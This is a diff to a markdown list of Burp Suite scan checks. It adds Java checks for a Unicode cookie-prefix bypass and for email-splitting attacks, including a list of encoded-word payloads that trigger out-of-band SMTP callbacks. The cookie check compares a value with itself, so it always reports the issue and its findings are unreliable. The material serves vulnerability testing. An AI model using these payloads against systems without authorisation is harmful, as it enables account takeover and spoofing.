@@ -54,6 +54,73 @@ for (var origin : new String[]{evilHttps, evilHttp})
 return AuditResult.auditResult();
 
 ```
+## [CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomScanChecks/CookiePrefixBypass.bambda)
+### Identifies HTTP cookie prefix bypass vulnerability.
+#### Author: d0ge
+```java
+if (!requestResponse.hasResponse()) return null;
+
+var req = requestResponse.request();
+var res = requestResponse.response();
+
+var map = new java.util.LinkedHashMap<String, HttpParameter>();
+res.cookies().stream()
+ .filter(c -> c.name().startsWith("__Host-") || c.name().startsWith("__Secure-"))
+  .forEach(c -> map.put(c.name(), HttpParameter.cookieParameter(c.name(), c.value())));
+req.parameters().stream()
+  .filter(p -> p.type() == HttpParameterType.COOKIE
+           && (p.name().startsWith("__Host-") || p.name().startsWith("__Secure-")))
+  .forEach(p -> map.put(p.name(), HttpParameter.cookieParameter(p.name(), p.value())));
+
+var merged = new java.util.ArrayList<>(map.values());
+if (merged.isEmpty()) {
+return null;
+}
+var exploit = req
+  .withRemovedParameters(merged)
+  .withAddedParameters(
+      merged.stream()
+            .map(p -> HttpParameter.cookieParameter("§§§" + p.name(), p.value()))
+            .toList()
+  );
+var downgrade = exploit.toString().replaceFirst("HTTP/2","HTTP/1.1");
+var prob = downgrade.replaceAll("§§§", "");
+var prob1 = api().http().sendRequest(HttpRequest.httpRequest(req.httpService(), prob), HttpMode.HTTP_1);
+if(!prob1.hasResponse()) {
+return null;
+}
+var attributes1 = prob1.response().attributes(AttributeType.COOKIE_NAMES);
+
+var data = ByteArray.byteArray(downgrade);
+int idx;
+while ((idx = data.indexOf("§§§")) != -1) {
+  data.setByte(idx,   (byte) 0xE2);
+  data.setByte(idx+1, (byte) 0x80);
+  data.setByte(idx+2, (byte) 0x80);
+}
+
+var respRx = api().http()
+  .sendRequest(HttpRequest.httpRequest(
+      req.httpService(), data), HttpMode.HTTP_1);
+if (!respRx.hasResponse()) return null;
+var attributes2 = respRx.response().attributes(AttributeType.COOKIE_NAMES);
+if(attributes1.getFirst().value() ==  attributes1.getFirst().value()) {
+return AuditResult.auditResult(burp.api.montoya.scanner.audit.issues.AuditIssue.auditIssue(
+      "Cookie Prefix Bypass",
+      "The server appears to be vulnerable to a <b>Unicode-based bypass</b> affecting cookies with the <b>__Host-</b> or <b>__Secure-</b> prefix. This issue exploits whitespace trimming behavior, allowing an attacker to set privileged cookies using visually similar names.",
+      "Ensure the server does not silently strip or normalize <i>Unicode space separator characters</i> (e.g. U+2000–U+200A) before parsing cookie names. These characters can be used to bypass prefix restrictions in modern browsers like Chrome and Firefox.",
+      req.url(),
+      burp.api.montoya.scanner.audit.issues.AuditIssueSeverity.LOW,
+      burp.api.montoya.scanner.audit.issues.AuditIssueConfidence.TENTATIVE,
+      "For technical background on Unicode-based cookie prefix bypasses, see: <a href=\"https://portswigger.net/research/cookie-chaos\">https://portswigger.net/research/cookie-chaos</a>",
+      "",
+      burp.api.montoya.scanner.audit.issues.AuditIssueSeverity.LOW,
+      respRx
+  ));
+}
+return null;
+
+```
 ## [DetectTRACEMethod.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomScanChecks/DetectTRACEMethod.bambda)
 ### Identifies requests with TRACE method enabled.
 #### Author: PortSwigger
@@ -99,6 +166,118 @@ for (var i = 0; i < 5; i++)
 }
 
 return AuditResult.auditResult();
+
+```
+## [EmailSplittingCollaboratorClient.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomScanChecks/EmailSplittingCollaboratorClient.bambda)
+### Performs an email splitting attack using encoded word. The Collaborator client is used to retrieve interactions. You should change the spoofServer to be your target domain e.g. example.com You can add more techniques using the techniques variable.
+#### Author: Gareth Heyes
+```java
+var POLL_SLEEP = 1_000;
+var TOTAL_TIME = 10_000;
+var spoofServer = "target.domain";
+var collaboratorClient = api().collaborator().createClient();
+var techniques = new String[]{
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=00?=foo@$SPOOF_SERVER"
+};
+
+HashMap<String, HttpRequestResponse> requestResponsesSent = new HashMap<>();
+
+for(var technique: techniques) {
+   var payload = collaboratorClient.generatePayload();
+   technique = technique.replaceAll("[$]COLLABORATOR_SERVER", payload.server().get().address());
+   technique = technique.replaceAll("[$]COLLABORATOR_PAYLOAD", payload.id().toString());
+   technique = technique.replaceAll("[$]SPOOF_SERVER", spoofServer);
+	HttpRequestResponse reqResp = http.sendRequest(insertionPoint.buildHttpRequestWithPayload(ByteArray.byteArray(technique)));
+   requestResponsesSent.put(payload.id().toString(), reqResp);
+}
+
+List<AuditIssue> auditIssues = new ArrayList<>();
+
+Function<String, String> newLinesToBr = s -> s.replaceAll("\r?\n","<br>");
+
+try {
+    long start = System.currentTimeMillis();
+    while (true) {
+        if (System.currentTimeMillis() - start >= TOTAL_TIME) break;
+        List<Interaction> list = collaboratorClient.getAllInteractions();
+        if (!list.isEmpty()) {
+            for (Interaction i : list) {
+                if (!i.smtpDetails().isPresent()) continue;                
+                var id = i.id().toString();
+                var conversation = i.smtpDetails().get().conversation().substring(0, 500) + "...";
+                var title = "Email address parser discrepancy";
+                var detail = "This site is vulnerable to an email splitting attack below is the SMTP conversation:"+utilities().htmlUtils().encode(conversation);
+                var remediation = """
+- Reject any address containing =? … ?= (“encoded-word”) patterns with a simple regex such as =[?].+[?]= before further processing.
+- Disable or strictly configure legacy address parsing features in mail libraries (UUCP bang paths, source routes, UTF-7, IDN/Punycode) whenever they are not required.
+- Never base authorisation decisions solely on the claimed email domain. Instead, verify ownership (for example, by sending a one-time link) or use cryptographically strong identity assertions.
+- Ensure server-side validation is performed by the same library that ultimately sends or stores the address, avoiding mixed-parser discrepancies.                
+                """;
+                var background = "Email syntax is governed by decades-old RFCs that permit comments, quoted local-parts, multiple encodings and obsolete routing notations. Modern web applications often validate addresses with a simple regex or framework helper, then pass them to deeper libraries (SMTP clients, IDN converters, etc.). An attacker can embed control characters or secondary @ symbols that survive the first check but are re-interpreted later, redirecting mail delivery or splitting the address during SMTP dialogue. The impact ranges from account takeover to cross-tenant data exposure and, where rendered in HTML contexts, stored XSS leading to RCE.";
+                var remediationBackground = "The simplest and most effective defence is disable: “encoded-word” as they are unnecessary in user registration flows and can be blocked cheaply. Disabling rarely used address forms in mail libraries closes additional vectors, while eliminating domain-based access checks removes the underlying trust flaw. Where email addresses must be accepted verbatim (for example, mail clients), sanitise or escape them before insertion into HTML or SQL contexts and confirm delivery via out-of-band verification.";               
+                auditIssues.add(AuditIssue.auditIssue(title, newLinesToBr.apply(title), newLinesToBr.apply(remediation), requestResponse.request().url(), AuditIssueSeverity.MEDIUM, AuditIssueConfidence.FIRM, newLinesToBr.apply(background), newLinesToBr.apply(remediationBackground), AuditIssueSeverity.MEDIUM, requestResponsesSent.get(id)));          
+            }
+        } 
+        java.util.concurrent.TimeUnit.MILLISECONDS.sleep(POLL_SLEEP);
+    }
+} catch (InterruptedException ignored) {}
+
+return AuditResult.auditResult(auditIssues);
+
+```
+## [EmailSplittingDefaultCollaborator.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomScanChecks/EmailSplittingDefaultCollaborator.bambda)
+### Performs an email splitting attack using encoded word. The default Collaborator client is used to retrieve interactions. You should change the spoofServer to be your target domain e.g. example.com Note this scan check using the default Collaborator tab and doesn't raise any issues. This allows you to use a long running task over the 2 minute window for scan checks. The main Collaborator tab will be updated if your probes are successful and receive Collaborator interactions.
+#### Author: Gareth Heyes
+```java
+var techniques = new String[]{
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=00?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=01?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=02?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=03?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=04?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=05?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=07?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=08?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=0e?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=0f?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=10?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=11?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=13?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=15?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=16?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=17?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=19?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=1a?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=1b?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=1c?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=1d?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=1f?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=3e=20?=foo@$SPOOF_SERVER",
+        "=?x?q?$COLLABORATOR_PAYLOAD=40$COLLABORATOR_SERVER=2c?=x@$SPOOF_SERVER",
+        "=?utf-7?q?$COLLABORATOR_PAYLOAD&AEA-$COLLABORATOR_SERVER&ACw-?=foo@$SPOOF_SERVER",
+        "=?utf-7?q?$COLLABORATOR_PAYLOAD&AEA-$COLLABORATOR_SERVER&ACw=/xyz!-?=foo@$SPOOF_SERVER",
+        "=?utf-7?q?$COLLABORATOR_PAYLOAD=26AEA-$COLLABORATOR_SERVER=26ACw-?=foo@$SPOOF_SERVER",
+        "$COLLABORATOR_PAYLOAD=?utf-7?b?JkFFQS0?=$COLLABORATOR_SERVER=?utf-7?b?JkFDdy0?=foo@$SPOOF_SERVER",
+        "$COLLABORATOR_PAYLOAD=?x?b?QA==?=$COLLABORATOR_SERVER=?x?b?LA==?=foo@$SPOOF_SERVER",
+        "=?utf-7?q?$COLLABORATOR_PAYLOAD&AEA-$COLLABORATOR_SERVER&ACA-?=foo@$SPOOF_SERVER",
+        "=?utf-7?q?$COLLABORATOR_PAYLOAD&AEA-$COLLABORATOR_SERVER&ACA=/xyz!-?=foo@$SPOOF_SERVER",
+        "=?utf-7?q?$COLLABORATOR_PAYLOAD=26AEA-$COLLABORATOR_SERVER=26ACA-?=foo@$SPOOF_SERVER",
+        "$COLLABORATOR_PAYLOAD=?utf-7?b?JkFFQS0?=$COLLABORATOR_SERVER=?utf-7?b?JkFDdy0?=foo@$SPOOF_SERVER",
+        "$COLLABORATOR_PAYLOAD=?x?b?QA==?=$COLLABORATOR_SERVER=?x?b?LA==?=foo@$SPOOF_SERVER"
+};
+
+var spoofServer = "target.domain";
+
+for(var technique: techniques) {
+    var payload = api().collaborator().defaultPayloadGenerator().generatePayload();
+    technique = technique.replaceAll("[$]COLLABORATOR_SERVER", payload.server().get().address());
+    technique = technique.replaceAll("[$]COLLABORATOR_PAYLOAD", payload.id().toString());
+    technique = technique.replaceAll("[$]SPOOF_SERVER", spoofServer);
+
+	HttpRequestResponse reqResp = http.sendRequest(insertionPoint.buildHttpRequestWithPayload(ByteArray.byteArray(technique)));
+}
+
+return null;
 
 ```
 ## [MissingCSPHeader.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomScanChecks/MissingCSPHeader.bambda)
